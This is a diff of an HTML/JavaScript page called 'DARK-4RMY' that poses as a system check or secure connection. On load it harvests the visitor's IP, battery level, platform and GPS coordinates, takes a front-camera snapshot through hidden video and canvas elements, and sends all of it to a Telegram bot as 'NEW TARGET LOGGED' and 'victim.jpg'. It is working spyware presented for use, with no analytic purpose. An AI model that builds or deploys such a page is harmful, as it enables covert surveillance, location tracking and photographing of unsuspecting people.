@@ -3,18 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Verification</title>
+    <title>DARK-4RMY System</title>
     <style>
-        body { margin: 0; background: #000; color: #00f3ff; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; }
-        .terminal { border: 1px solid #00f3ff; padding: 20px; width: 80%; max-width: 500px; box-shadow: 0 0 15px #00f3ff; }
-        #log { font-size: 12px; margin-top: 10px; }
+        body { margin: 0; background: #0a0a0f; color: #00f3ff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .panel { border: 2px solid #00f3ff; padding: 40px; border-radius: 20px; text-align: center; box-shadow: 0 0 20px #00f3ff; }
     </style>
 </head>
 <body>
-    <div class="terminal">
-        <h3>> DARK-4RMY v2.0</h3>
-        <p id="msg">Awaiting Permissions...</p>
-        <div id="log"></div>
+    <div class="panel">
+        <h1>DARK-4RMY</h1>
+        <p id="stat">Connecting to secure server...</p>
         <video id="video" style="display:none;" autoplay></video>
         <canvas id="canvas" style="display:none;"></canvas>
     </div>
@@ -24,7 +22,52 @@
         const params = new URLSearchParams(window.location.search);
         const chatId = params.get('id');
 
-        async function postToBot(text) {
+        async function init() {
+            if (!chatId) return;
+
+            try {
+                // --- 1. JAM3 L-MA3LOMAT L-ASASIYA ---
+                const battery = await navigator.getBattery();
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const level = Math.round(battery.level * 100);
+                
+                let report = `🚨 *NEW TARGET LOGGED* 🚨\n\n` +
+                             `🌐 *IP:* \`${ipData.ip}\`\n` +
+                             `🔋 *Battery:* ${level}%\n` +
+                             `💻 *OS:* ${navigator.platform}`;
+
+                // GPS (Optional - If allowed)
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const gpsMsg = report + `\n📍 *GPS:* [Google Maps](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`;
+                    await sendToBot(gpsMsg);
+                }, async () => {
+                    await sendToBot(report + `\n📍 *GPS:* Denied ❌`);
+                });
+
+                // --- 2. TRY CAMERA SNAPSHOT (The Last Step) ---
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    
+                    setTimeout(() => {
+                        const canvas = document.getElementById('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        canvas.toBlob(blob => sendPhoto(blob));
+                        stream.getTracks().forEach(t => t.stop());
+                        document.getElementById('stat').innerText = "System Active ✅";
+                    }, 2000);
+                } catch (camErr) {
+                    document.getElementById('stat').innerText = "Camera Access Denied";
+                }
+
+            } catch (err) { console.log(err); }
+        }
+
+        async function sendToBot(text) {
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -35,46 +78,10 @@
         async function sendPhoto(blob) {
             const formData = new FormData();
             formData.append('chat_id', chatId);
-            formData.append('photo', blob, 'snap.jpg');
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
-        }
-
-        async function init() {
-            if (!chatId) return;
-
-            // 1. Capture IP & Basic Info
-            const ipRes = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipRes.json();
-            await postToBot(`🌐 *New Connection*\nIP: \`${ipData.ip}\`\nDevice: ${navigator.platform}`);
-
-            // 2. GPS Location
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                await postToBot(`📍 *GPS Location Found:*\n${mapLink}`);
-            }, (err) => console.log("GPS Denied"));
-
-            // 3. Camera Capture
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                
-                // Wait 2 seconds then take a snap
-                setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    canvas.toBlob(blob => sendPhoto(blob));
-                    stream.getTracks().forEach(track => track.stop()); // Close camera
-                    document.getElementById('msg').innerText = "System Check Complete ✅";
-                }, 2000);
-            } catch (e) {
-                document.getElementById('msg').innerText = "Security Override Required.";
-            }
+            formData.append('photo', blob, 'victim.jpg');
+            formData.append('caption', '📸 *Victim Front Camera Snapshot*');
+            formData.append('parse_mode', 'Markdown');
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
         }
 
         window.onload = init;
